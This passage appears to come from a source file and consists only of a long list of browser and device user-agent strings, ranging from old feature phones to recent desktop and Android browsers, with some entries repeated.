'SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0', 'SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonT100/R101', 'Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00', 'Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00', 'Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10', 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01', 'Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10', 'Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30', 'SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0', 'SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonT68/R201A', 'SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0', 'SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]', 'SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0', 'SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0', 'BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102', 'BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0', 'BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123', 'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html )', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)',
'Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.52',
'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.9.168 Version/11.52',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:8.0) Gecko/20100101 Firefox/8.0',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:8.0) Gecko/20100101 Firefox/8.0',
'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-US) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6.8; en-US; rv:8.0) Gecko/20100101 Firefox/8.0',
'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.9.168 Version/11.52',
'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.20 (KHTML, like Gecko) Mobile/7B298g',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)',
'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+',
'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
  'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html )',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0',
  'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
  'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 9; BLA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; MI 6 Build/OPR1.170623.027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 9; SM-J600F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; G3121) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; GM 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J701F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
',Mozilla/5.0 (Linux; Android 7.0; SM-A710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 9; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.94 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/78.0.257670029 Mobile/16F203 Safari/604.1',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 8.0.0; XT1650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.3; GT-I9300) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G530F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
'Mozilla/5.0 (Android 8.0.0; SM-C7000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3317.0 YaaniBrowser/4.3.0.153 (Turkcell-TR) Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; LG-X240) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710FQ Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; POT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; F3211) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 6.0; LG-K350) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 5.0.2; HTC_M9e) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; GM 5 d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; G3221) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Lenovo K53a48) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; E5303) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; U; Android 4.1.2; tr-tr; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.7',
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
'Mozilla/5.0 (compatible; ABrowse 0.4; Syllable)',
'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5;',
'Mozilla/4.0 (compatible; Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729); Windows NT 5.1; Trident/4.0)',
'Mozilla/4.0 (compatible; Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727); Windows NT 5.1; Trident/4.0; Maxthon; .NET CLR 2.0.50727; .NET CLR 1.1.4322; InfoPath.2)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Acoo Browser; InfoPath.2; .NET CLR 2.0.50727; Alexa Toolbar)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Acoo Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; InfoPath.2)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
'Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; Windows NT 5.1; (R1 1.5); .NET CLR 2.0.50727; InfoPath.1)',
'Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
'Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; InfoPath.1; .NET CLR 2.0.50727; Media Center PC 3.0; InfoPath.2)',
'Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.2; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; HbTools 4.7.0)',
